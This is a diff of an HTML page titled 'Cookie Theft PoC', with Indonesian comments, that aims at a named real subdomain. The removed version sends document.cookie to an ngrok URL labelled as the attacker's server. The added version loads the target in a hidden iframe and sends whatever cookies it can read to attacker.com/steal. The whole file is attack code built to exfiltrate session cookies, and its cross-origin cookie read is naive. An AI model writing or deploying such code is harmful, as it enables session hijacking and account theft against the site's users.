@@ -1,27 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cookie Theft PoC</title>
+    <title>POC - Ambil Cookie</title>
 </head>
 <body>
-    <h1>Cookie Theft PoC</h1>
-    <p>Click the button to send a request to example.com and steal cookies.</p>
-    <button id="stealCookies">Steal Cookies</button>
-
+    <h1>POC - Ambil Cookie dari example.com</h1>
+    <iframe id="targetFrame" src="https://airflow.soundcloud.org" style="display:none;"></iframe>
     <script>
-        document.getElementById('stealCookies').onclick = function() {
-            // Create a new image element to trigger a request to example.com
-            var img = new Image();
-            img.src = "https://airflow.soundcloud.org/"; // Change this to a valid resource on example.com
+        // Tunggu hingga iframe dimuat
+        document.getElementById('targetFrame').onload = function() {
+            try {
+                // Akses cookie dari iframe
+                var cookies = document.getElementById('targetFrame').contentWindow.document.cookie;
 
-            // Add an event listener to capture the cookies if the request is successful
-            img.onload = function() {
-                // Since we cannot directly access the cookies, we can send the request to our server
+                // Kirim cookie ke server penyerang
                 var xhr = new XMLHttpRequest();
-                xhr.open("GET", "https://bd72-36-73-33-194.ngrok-free.app" + document.cookie, true); // Send the cookies to the attacker's server
+                xhr.open("GET", "https://attacker.com/steal?cookies=" + encodeURIComponent(cookies), true);
                 xhr.send();
-            };
+            } catch (e) {
+                console.log("Gagal mengambil cookie:", e);
+            }
         };
     </script>
 </body>
 </html>
+
